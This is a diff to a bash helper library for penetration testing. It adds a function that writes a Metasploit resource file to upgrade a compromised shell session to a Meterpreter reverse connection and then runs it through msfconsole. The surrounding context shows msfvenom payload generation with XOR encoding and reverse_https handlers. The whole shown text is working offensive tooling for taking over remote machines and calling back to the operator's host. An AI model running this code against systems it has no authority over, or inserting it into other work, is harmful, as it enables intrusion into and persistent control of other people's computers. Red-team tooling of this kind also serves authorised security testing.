@@ -17,6 +17,7 @@ nb-shell-handlers-msf-ssl-gen            impersonate a real SSL certificate for 
 nb-shell-handlers-msf-w64-https          multi-handler for staged windows/x64/meterpreter/reverse_https payload
 nb-shell-handlers-msf-listener           set up metasploit listener
 nb-shell-handlers-msf-payload            set up metasploit payload
+nb-shell-handlers-msf-upgrade-shell      upgrade metasploit shell to meterpreter
 
 DOC
 }
@@ -274,4 +275,26 @@ nb-shell-handlers-msf-payload() {
          echo
          msfvenom -p $payload LHOST=${__LHOST} LPORT=${__LPORT} -f $format -a $arch --platform $platform -e x64/xor_dynamic -i $iterations -o $HOME/desktop/server/$x$extention
     fi
+}
+
+nb-shell-handlers-msf-upgrade-shell() {
+    __check-project
+    nb-vars-set-lhost
+    nb-vars-set-lport
+
+    echo "Use C-z to background shell and 'sessions' to list sessions"
+    echo "Use session <ID> to interact with session"
+    echo
+    echo -n "Which session is it on?"
+    read __SESSION
+
+    rc_file="/tmp/msf_shell_upgrade.rc"
+
+    echo "use post/multi/manage/shell_to_meterpreter" > "$rc_file"
+    echo "set LHOST ${__LHOST}" >> "$rc_file"
+    echo "set SESSION ${__SESSION}" >> "$rc_file"
+    echo "set LPORT ${__LPORT}" >> "$rc_file"
+    echo "exploit -j" >> "$rc_file"
+
+    msfconsole -q -r "$rc_file"
 }
